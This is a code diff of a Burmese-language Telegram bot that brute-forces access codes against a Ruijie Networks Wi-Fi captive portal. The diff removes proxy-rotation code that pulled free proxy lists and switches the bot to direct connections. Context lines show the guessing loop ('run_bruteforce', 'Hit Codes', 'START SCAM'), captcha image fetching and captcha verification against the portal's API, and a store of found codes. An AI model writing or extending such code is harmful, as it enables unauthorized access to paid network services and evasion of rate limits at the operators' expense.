@@ -29,86 +29,6 @@ ADMIN_USERNAME = "@gobiln07"
 def is_admin(user_id):
     return str(user_id) in ADMINS
 
-# ==================== PROXY AUTO UPDATE ====================
-PROXY_SOURCES = [
-    "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/all/data.txt",
-    "https://cdn.jsdelivr.net/gh/proxyscrape/free-proxy-list@main/proxies/all/data.txt",
-    "https://raw.githubusercontent.com/proxmint/free-proxy-list/main/proxies/http.txt",
-]
-
-PROXY_LIST = []
-_proxy_index = 0
-last_proxy_update = 0
-
-def fetch_proxies_sync():
-    global PROXY_LIST, last_proxy_update
-    all_proxies = set()
-    for url in PROXY_SOURCES:
-        try:
-            import requests
-            r = requests.get(url, timeout=5)
-            if r.status_code == 200:
-                for line in r.text.split("\n"):
-                    line = line.strip()
-                    if line and ":" in line and not line.startswith("#"):
-                        all_proxies.add(line)
-        except:
-            pass
-    PROXY_LIST = list(all_proxies)
-    last_proxy_update = time.time()
-    print(f" Proxy {len(PROXY_LIST)} ခု ရယူပြီး")
-    return PROXY_LIST
-
-async def fetch_proxies_async():
-    global PROXY_LIST, last_proxy_update
-    all_proxies = set()
-    for url in PROXY_SOURCES:
-        try:
-            async with aiohttp.ClientSession() as session:
-                async with session.get(url, timeout=5) as response:
-                    if response.status == 200:
-                        text = await response.text()
-                        for line in text.split("\n"):
-                            line = line.strip()
-                            if line and ":" in line and not line.startswith("#"):
-                                all_proxies.add(line)
-        except:
-            pass
-    PROXY_LIST = list(all_proxies)
-    last_proxy_update = time.time()
-    print(f" Proxy {len(PROXY_LIST)} ခု ရယူပြီး")
-    return PROXY_LIST
-
-async def auto_update_proxies():
-    while True:
-        await fetch_proxies_async()
-        await asyncio.sleep(1800)
-
-def get_next_proxy():
-    global _proxy_index
-    if not PROXY_LIST:
-        return None
-    proxy = PROXY_LIST[_proxy_index % len(PROXY_LIST)]
-    _proxy_index += 1
-    return f"http://{proxy}"
-
-# ==================== PROXY STATUS COMMAND ====================
-async def show_proxy_status(message):
-    if not is_admin(message.chat.id):
-        await bot.reply_to(message, "No Permission")
-        return
-    if last_proxy_update > 0:
-        update_time = datetime.fromtimestamp(last_proxy_update).strftime('%Y-%m-%d %H:%M:%S')
-    else:
-        update_time = "Never"
-    await bot.reply_to(
-        message,
-        f" **Proxy Status**\n\n"
-        f" Total Proxies: {len(PROXY_LIST)}\n"
-        f" Last Update: {update_time}\n"
-        f" Sources: {len(PROXY_SOURCES)}"
-    )
-
 # ==================== KEYBOARDS ====================
 def get_main_keyboard():
     keyboard = InlineKeyboardMarkup(row_width=1)
@@ -156,11 +76,10 @@ def get_start_scam_keyboard():
     keyboard.add(
         InlineKeyboardButton(" Owner by @DogGod7475", callback_data="menu_owner"),
         InlineKeyboardButton(" Telegram @DogGod7475", callback_data="menu_telegram"),
-        InlineKeyboardButton("+ Add Proxies", callback_data="menu_add_proxies"),
         InlineKeyboardButton(" Update Portal", callback_data="menu_update_portal"),
         InlineKeyboardButton(" Mode", callback_data="menu_scan_mode"),
         InlineKeyboardButton(" Current Mode: running", callback_data="menu_mode"),
-        InlineKeyboardButton(" Proxies: 0/0", callback_data="menu_proxies"),
+        InlineKeyboardButton(" Proxies: Direct", callback_data="menu_proxies"),
         InlineKeyboardButton(" START SCAN", callback_data="menu_start_scam"),
         InlineKeyboardButton(" STOP SCAN", callback_data="menu_stop"),
         InlineKeyboardButton(" Back", callback_data="menu_back")
@@ -332,25 +251,6 @@ async def callback_handler(call):
         await bot.answer_callback_query(call.id)
         return
     
-    if call.data == "menu_add_proxies":
-        await bot.edit_message_text(
-            chat_id=chat_id,
-            message_id=call.message.message_id,
-            text="""+ Add Proxies
-
-Proxyများကို အောက်ပါအတိုင်း တစ်ကြောင်းချင်းစီ ထည့်သွင်းပါ။
-
-ဥပမာ:
-130.110.103.245:3128
-213.131.85.29:1976
-1.231.81.166:3128
-
-ထည့်သွင်းပြီးပါက Bot က အလိုအလျောက် သိမ်းဆည်းပေးပါမည်။""",
-            reply_markup=get_back_keyboard()
-        )
-        await bot.answer_callback_query(call.id)
-        return
-    
     if call.data == "menu_update_portal":
         await bot.edit_message_text(
             chat_id=chat_id,
@@ -453,7 +353,7 @@ URL ကို တန်းပို့ပါ။""",
  Expired: 0
  Limits: 0
  Speed: 0.0 c/m
- Proxies: 0/0
+ Proxies: Direct
 
  Hit Codes:
 None yet""")
@@ -516,7 +416,7 @@ Key ရရှိပြီးပါက အောက်ပါ command ကို �
             codes = "\n".join(results[user_id])
             text = f" Found Codes:\n{codes}"
         else:
-            text = " သင့်တွင် ယခင်ကရရှိထားသော success code မရှိသေးပါ။"
+            text = " သင့်တွင် ယခင်ကရရှိထားသော code မရှိသေးပါ။"
         
         await bot.edit_message_text(
             chat_id=chat_id,
@@ -632,10 +532,7 @@ async def recheck_command(message):
     results, sha = await get_file_content("result.json")
     chat_id_str = str(message.chat.id)
     if chat_id_str in results and results[chat_id_str]:
-        if message.chat.id not in user_data:
-            await bot.reply_to(message, "Scan လုပ်ရန် Portal URL ကိုအရင်ထည့်သွင်းပေးပါ။")
-            return
-        if "session_url" not in user_data.get(message.chat.id, {}):
+        if message.chat.id not in user_data or "session_url" not in user_data.get(message.chat.id, {}):
             await bot.reply_to(message, "Scan လုပ်ရန် Portal URL ကိုအရင်ထည့်သွင်းပေးပါ။")
             return
         codes = results[chat_id_str]
@@ -957,7 +854,7 @@ async def handle_key_scan(message):
  Expired: 0
  Limits: 0
  Speed: 0.0 c/m
- Proxies: 0/0
+ Proxies: Direct
 
  Hit Codes:
 None yet""")
@@ -997,7 +894,7 @@ async def status(message):
         f" Active Scans: {active_scans}\n"
         f" Users: {approved_users}\n"
         f" Sessions Loaded: {len(user_data)}\n"
-        f" Proxies: {len(PROXY_LIST)}"
+        f" Proxies: Direct Connection"
     )
 
 async def send_success_file(chat_id):
@@ -1191,9 +1088,6 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, prog
             else:
                 hit_codes_text = "None yet"
             
-            proxies_used = len(PROXY_LIST) if PROXY_LIST else 0
-            proxies_total = len(PROXY_LIST) if PROXY_LIST else 0
-            
             text = f"""{𝐆𝐎𝐁𝐋𝐈𝐍_𝐋𝐎𝐆𝐎}
 
  STOP SCAM
@@ -1204,7 +1098,7 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, prog
  Expired: 0
  Limits: 0
  Speed: {speed:.1f} c/m
- Proxies: {proxies_used}/{proxies_total}
+ Proxies: Direct
 
  Hit Codes:
 {hit_codes_text}"""
@@ -1277,10 +1171,7 @@ async def get_session_id(session, session_url, previous_session_id=None):
         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36'
     }
     
-    proxy = get_next_proxy()
     kwargs = {"headers": headers, "allow_redirects": True}
-    if proxy:
-        kwargs["proxy"] = proxy
     
     try:
         async with session.get(session_url, **kwargs) as req:
@@ -1354,12 +1245,8 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                 "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
             }
             
-            proxy = get_next_proxy()
-            
             try:
                 kwargs = {"json": data, "headers": headers}
-                if proxy:
-                    kwargs["proxy"] = proxy
                 async with task_session.post(post_url, **kwargs) as req:
                     response = await req.text()
                     resp_json = json.loads(response)
@@ -1419,11 +1306,8 @@ async def Code_Expires_Date(active_id):
         timeout=timeout
     ) as fresh_session:
         for url in paths:
-            proxy = get_next_proxy()
             try:
                 kwargs = {"headers": headers}
-                if proxy:
-                    kwargs["proxy"] = proxy
                 async with fresh_session.get(url, **kwargs) as req:
                     if req.status == 200:
                         respond = await req.json()
@@ -1492,10 +1376,7 @@ async def Captcha_Image(session, session_id):
         '_t': str(time.time()),
     }
     
-    proxy = get_next_proxy()
     kwargs = {"params": params, "headers": headers}
-    if proxy:
-        kwargs["proxy"] = proxy
     
     async with session.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', **kwargs) as req:
         return await req.read()
@@ -1512,10 +1393,7 @@ async def Varify_Captcha(session, session_id, text):
         'authCode': text,
     }
     
-    proxy = get_next_proxy()
     kwargs = {"headers": headers, "json": json_data}
-    if proxy:
-        kwargs["proxy"] = proxy
     
     async with session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', **kwargs) as req:
         data = await req.json()
@@ -1555,25 +1433,11 @@ async def main():
     try:
         asyncio.create_task(web_server())
         asyncio.create_task(local_update_scheduler())
-        asyncio.create_task(auto_update_proxies())
         await start_polling()
     finally:
         await session.close()
         await _connector.close()
 
 if __name__ == '__main__':
-    import requests
-    for url in PROXY_SOURCES:
-        try:
-            r = requests.get(url, timeout=5)
-            if r.status_code == 200:
-                for line in r.text.split("\n"):
-                    line = line.strip()
-                    if line and ":" in line and not line.startswith("#"):
-                        if line not in PROXY_LIST:
-                            PROXY_LIST.append(line)
-        except:
-            pass
-    print(f" Proxy {len(PROXY_LIST)} ခု ရယူပြီး")
-    print(f" Auto Update ကို မိနစ် ၃၀ တစ်ခါ လုပ်မည်")
+    print(" Direct Connection Mode စတင်နေပါပြီ...")
     asyncio.run(main())
